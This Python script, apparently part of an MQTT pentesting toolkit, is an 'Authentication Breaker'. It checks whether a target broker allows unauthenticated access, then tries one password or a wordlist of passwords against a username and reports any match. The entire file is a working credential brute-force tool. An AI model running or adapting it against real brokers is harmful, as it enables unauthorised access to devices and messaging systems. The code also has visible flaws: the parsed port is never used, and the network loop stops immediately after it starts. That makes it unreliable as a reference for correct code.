import sys
import time
import socket

from parsers import auth_parser

from utils import printmessage, rc_msgs, on_message, printarg

from termcolor import colored


import paho.mqtt.client as mqttclient

no_auth = False
checked = False
found = False


def on_connect(client, userdata, flags, rc) :
    if rc == 0 :
        global connected, no_auth, checked
        connected = True
        
        if not checked :
            no_auth = True
        else :
            printmessage(f"Password for {username} is {password}", 'success')

            global found
            found = True

        checked = True

    elif rc == 4 or rc == 5 :
        if not checked :
            pass
        else :
            printmessage("Invalid password", 'error')

        checked = True

    else :
        if not checked :
            pass
        else :
            printmessage(rc_msgs[rc], 'error')

        checked = True


connected = False




args = auth_parser.parse_args()


host = args.host
port = args.port
username = args.username
password = args.password
filepath = args.filepath



print("")
printarg('host', host)
printarg('port', port)
printarg('username', username)
printarg('password', password)
printarg('filepath', filepath)
print("")
      
client = mqttclient.Client('MQTT Implementation - Authentication Breaker')




client.on_connect = on_connect

try :
    client.connect(host)
except socket.gaierror :
    printmessage("The IP address or domain name of the broker is not known", 'error')
    sys.exit(1)

except ConnectionRefusedError :
    printmessage('''Connection refused. Check if the broker is running and the correct port is given. Check if there is any firewall blocking connection''', 'error')
    sys.exit(1)


topic = "topic"
message = "message"

client.publish(topic, message)

client.loop_start()

client.loop_stop()

if no_auth :
    printmessage("The target MQTT broker does not need any authentication", 'success')
    sys.exit(0)



if password is not None :
    client.username_pw_set(username, password)

    client.on_connect = on_connect

    try :
        client.connect(host)
    except socket.gaierror :
        printmessage("The IP address or domain name of the broker is not known", 'error')
        sys.exit(1)

    except ConnectionRefusedError :
        printmessage('''Connection refused. Check if the broker is running and the correct port is given. Check if there is any firewall blocking connection''', 'error')
        sys.exit(1)


    topic = "topic"
    message = "message"

    client.publish(topic, message)

    client.loop_start()

    client.loop_stop()


if filepath is not None :

    try :
        f = open(filepath)
    except FileNotFoundError as e :
        printmessage(str(e), 'error')
        sys.exit(0)


    for line in f.readlines() :
        password = line.strip()

        client.username_pw_set(username, password)

        client.on_connect = on_connect

        try :
            client.connect(host)
        except socket.gaierror :
            print("The IP address or domain name of the broker is not known")
            sys.exit(1)

        except ConnectionRefusedError :
            print('''Connection refused. Check if the broker is running and the correct port is given. Check if there is any firewall blocking connection''')
            sys.exit(1)


        topic = "topic"
        message = "message"

        client.publish(topic, message)

        client.loop_start()

        client.loop_stop()

        if found :
            sys.exit(0)

    printmessage("No password matches the credentials", 'error')